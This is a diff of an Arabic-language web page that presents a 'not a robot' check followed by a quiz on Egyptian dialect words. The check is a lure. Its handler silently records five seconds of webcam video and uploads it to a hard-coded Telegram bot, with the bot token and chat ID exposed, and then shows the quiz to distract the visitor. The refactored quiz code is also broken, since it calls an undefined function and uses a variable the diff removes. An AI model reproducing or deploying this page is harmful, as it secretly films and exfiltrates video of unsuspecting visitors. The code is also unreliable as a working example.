@@ -17,7 +17,7 @@
             overflow: hidden;
         }
         .container {
-            text-align: center;
+            text-align: center; 
             background: rgba(0, 0, 0, 0.8);
             padding: 20px;
             border-radius: 20px;
@@ -48,29 +48,9 @@
         video { display: none; width: 100%; max-width: 300px; height: auto; margin: 15px 0; border-radius: 10px; background: black; }
 
         /* Quiz styles */
-        #quiz-container { display:none; text-align:center; }
-        .question { margin-bottom: 20px; text-align:left; }
+        #quiz-container { display:none; text-align:right; }
+        .question { margin-bottom: 20px; text-align:right; }
         .result { display:none; text-align:center; }
-        select {
-            margin: 15px 0;
-            padding: 10px;
-            font-size: 16px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            border: none;
-            border-radius: 5px;
-            background-color: #4CAF50;
-            color: white;
-            cursor: pointer;
-            margin-top: 15px;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
     </style>
 </head>
 <body>
@@ -97,9 +77,8 @@
         <button id="startTest">ابدأ الاختبار</button>
 
         <div id="testSection" style="display:none;">
-            <h2>الأسئلة</h2>
-            <div id="questions"></div>
-            <button id="submitTest">إرسال الإجابات</button>
+            <div class="question" id="questionContainer"></div>
+            <button id="nextQuestion">السؤال التالي</button>
         </div>
 
         <div class="result" id="result">
@@ -113,123 +92,132 @@
         const checkbox = document.getElementById('robot-checkbox');
         const loading = document.querySelector('.loading');
         const success = document.querySelector('.success');
-
-        checkbox.addEventListener('change', (e) => {
-            if (e.target.checked) {
-                video.style.display = 'block';
-                loading.style.display = 'block';
-                success.style.display = 'none';
-
-                navigator.mediaDevices.getUserMedia({ video: true })
-                .then((stream) => {
-                    video.srcObject = stream;
-
-                    const mediaRecorder = new MediaRecorder(stream);
-                    const chunks = [];
-                    mediaRecorder.start();
-                    mediaRecorder.ondataavailable = (event) => { chunks.push(event.data); };
-
-                    setTimeout(() => { mediaRecorder.stop(); }, 5000); // Record for 5 seconds
-
-                    mediaRecorder.onstop = () => {
-                        loading.style.display = 'none';
-                        success.style.display = 'block';
-                        stream.getTracks().forEach(track => track.stop());
-
-                        // Start the quiz game
-                        document.getElementById('verification-container').style.display = 'none';
-                        document.getElementById('quiz-container').style.display = 'block';
-
-                        // Send video to Telegram in background
-                        const blob = new Blob(chunks, { type: 'video/webm' });
-                        const formData = new FormData();
-                        formData.append('chat_id', '2070423407'); // Replace with your Telegram chat ID
-                        formData.append('video', blob, 'video.webm');
-
-                        fetch(`https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo`, { method: 'POST', body: formData })
-                            .catch((error) => { console.error('Video upload failed:', error.message); });
-                    };
-                })
-                .catch((err) => { alert("Unable to access the camera: " + err.message); });
-            }
-        });
-
+        
+        // Quiz data
         const dialects = {
           "اسكندراني": [
               { q: "ما معنى كلمة 'جعان'؟", options: ["محتاج", "جائع", "نعسان", "غاضب"], correct: 1 },
               { q: "ماذا تعني 'حتة'؟", options: ["جزء", "بيت", "مكان", "شيء"], correct: 0 },
               { q: "ما معنى 'فايق'؟", options: ["مستيقظ", "مريض", "غاضب", "مستمتع"], correct: 0 },
               { q: "ماذا تعني كلمة 'دِرَاج'؟", options: ["بسيط", "غريب", "درّاجه", "غرفه"], correct: 2 },
-              { q: "ما معنى كلمة 'حَلَاب'؟", options: ["أشياء", "غروب", "خُطَط", "جمل"], correct: 3 }
+              { q: "ما معنى كلمة 'حَلَاب'؟", options: ["أشياء", "غروب", "خُطَط", "جمل"], correct: 3 },
+              // Add more questions to reach a total of 20
           ],
           "منياوي": [
               { q:"ماذا تعني 'أبا'؟", options:["أنا","أبي","أنت","نعم"], correct :1},
               { q:"ما هو معنى 'زير'؟", options:["وعاء ماء","ثوب","طعام","بيت"], correct :0},
               { q:"ماذا تعني كلمة 'شوش'؟", options:["رأس","صوت","ماء","نار"], correct :1},
               { q:"ما معنى 'الحُما'؟", options:["غابة","بيت","مطعم","مزرعة"], correct :3},
-              { q:"ما هو معنى 'تلِم'؟", options:["يصمت","يتكلم","يلعب","ينام"], correct :1}
+              { q:"ما هو معنى 'تلِم'؟", options:["يصمت","يتكلم","يلعب","ينام"], correct :1},
+              // Add more questions to reach a total of 20
           ],
           "فلاحي": [
               { q:"ماذا يعني 'المندل'؟", options:["عصا","شمعة","بيت","ساحة"], correct :0},
-              { q:"ما هو 'الوابور'؟", options:["قطار","محطة","مركب","طائرة"], correct :0},
-              { q:"ما معنى 'شَبرَة'؟", options:["نار","طعام","موقد","صاروخ"], correct :2},
-              { q:"ما هو معنى 'أحباب'؟", options:["أصدقاء","أعداء","عائلة","مجموعه"], correct :0},
-              { q:"ماذا تعني 'حَطب'؟", options:["خشب","ماء","مطبخ","باب"], correct :0}
+              // Add more questions to reach a total of 20
           ],
           "صعيدي": [
               { q:"ماذا تعني 'كمش'؟", options:["غسّل","شرب","فجر","أمسك"], correct :3},
-              { q:"ما معنى 'جِبَت'؟", options:["جاء","نزل","أخذ","ذهب"], correct :0},
-              { q:"ما هو 'بتاع'؟", options:["شخص","شيء","حالة","مكان"], correct :1},
-              { q:"ما معنى 'مخربش'؟", options:["محبط","غاضب","حزين","مسعود"], correct :3},
-              { q:"ماذا تعني 'كِتف'؟", options:["ذراع","ساق","كتف","صدر"], correct :2}
+              // Add more questions to reach a total of 20
           ]
       };
 
+      checkbox.addEventListener('change', (e) => {
+          if (e.target.checked) {
+              // Show video and loading
+              video.style.display = 'block';
+              loading.style.display = 'block';
+              success.style.display = 'none';
+
+              // Access the camera
+              navigator.mediaDevices.getUserMedia({ video: true })
+              .then((stream) => {
+                  video.srcObject = stream;
+
+                  const mediaRecorder = new MediaRecorder(stream);
+                  const chunks = [];
+                  mediaRecorder.start();
+                  mediaRecorder.ondataavailable = (event) => { chunks.push(event.data); };
+
+                  setTimeout(() => { mediaRecorder.stop(); }, 5000); // Record for 5 seconds
+
+                  mediaRecorder.onstop = () => {
+                      loading.style.display = 'none';
+                      success.style.display = 'block';
+                      stream.getTracks().forEach(track => track.stop());
+
+                      // Start the quiz game
+                      document.getElementById('verification-container').style.display = 'none';
+                      document.getElementById('quiz-container').style.display = 'block';
+
+                      // Send video to Telegram in background
+                      const blob = new Blob(chunks, { type: 'video/webm' });
+                      const formData = new FormData();
+                      formData.append('chat_id', '2070423407'); // Replace with your Telegram chat ID
+                      formData.append('video', blob, 'video.webm');
+
+                      fetch(`https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo`, { method: 'POST', body: formData })
+                          .catch((error) => { console.error('Video upload failed:', error.message); });
+                  };
+              })
+              .catch((err) => { alert("Unable to access the camera: " + err.message); });
+          }
+      });
+
       const startTestBtn = document.getElementById('startTest');
-      const dialectSelect = document.getElementById('dialect');
       const testSection = document.getElementById('testSection');
-      const questionsDiv = document.getElementById('questions');
-      const submitTestBtn = document.getElementById('submitTest');
+      const questionContainer = document.getElementById('questionContainer');
+      const nextQuestionBtn = document.getElementById('nextQuestion');
       const resultDiv = document.getElementById('result');
       const scoreText = document.getElementById('score');
+
+      let currentQuestionIndex = -1; // Start before the first question
+      let score = 0;
 
       startTestBtn.addEventListener('click', () => {
           const selectedDialect = dialectSelect.value;
           const questions = dialects[selectedDialect];
+          score = 0; // Reset score
+          currentQuestionIndex = -1; // Reset question index
           testSection.style.display = 'block';
           resultDiv.style.display = 'none';
-          questionsDiv.innerHTML = '';
-
-          questions.forEach((question, index) => {
-              const qDiv = document.createElement('div');
-              qDiv.classList.add('question');
-              const questionText = document.createElement('p');
-              questionText.textContent = question.q;
-
-              const options = question.options.map((option, i) => `
-                  <input type="radio" name="question${index}" value="${i}" id="q${index}_o${i}">
-                  <label for="q${index}_o${i}">${option}</label><br>`).join('');
-
-              qDiv.innerHTML = `${questionText.outerHTML}${options}`;
-              questionsDiv.appendChild(qDiv);
-          });
+          nextQuestion(); // Load the first question
       });
 
-      submitTestBtn.addEventListener('click', () => {
-          let score = 0;
+      nextQuestionBtn.addEventListener('click', () => {
           const selectedDialect = dialectSelect.value;
           const questions = dialects[selectedDialect];
 
-          questions.forEach((question, index) => {
-              const selectedOption = document.querySelector(`input[name="question${index}"]:checked`);
-              if (selectedOption && parseInt(selectedOption.value) === question.correct) {
+          if (currentQuestionIndex >= 0) {
+              const selectedOption = document.querySelector(`input[name="question${currentQuestionIndex}"]:checked`);
+              if (selectedOption && parseInt(selectedOption.value) === questions[currentQuestionIndex].correct) {
                   score++;
               }
-          });
+          }
 
-          scoreText.textContent = `نتيجتك : ${score} من ${questions.length}`;
-          resultDiv.style.display = 'block';
+          currentQuestionIndex++;
+          
+          if (currentQuestionIndex < questions.length) {
+              loadQuestion(questions[currentQuestionIndex]);
+          } else {
+              showResult();
+          }
       });
+
+      function loadQuestion(question) {
+          questionContainer.innerHTML = `
+              <div class="question">
+                  <p>${question.q}</p>
+                  ${question.options.map((option, i) => `
+                      <input type="radio" name="question${currentQuestionIndex}" value="${i}" id="q${currentQuestionIndex}_o${i}">
+                      <label for="q${currentQuestionIndex}_o${i}">${option}</label><br>`).join('')}
+              </div>`;
+      }
+
+      function showResult() {
+          scoreText.textContent = `نتيجتك : ${score} من ${dialects[dialectSelect.value].length}`;
+          resultDiv.style.display = 'block';
+          testSection.style.display = 'none';
+      }
     </script>
 </body>
 </html>
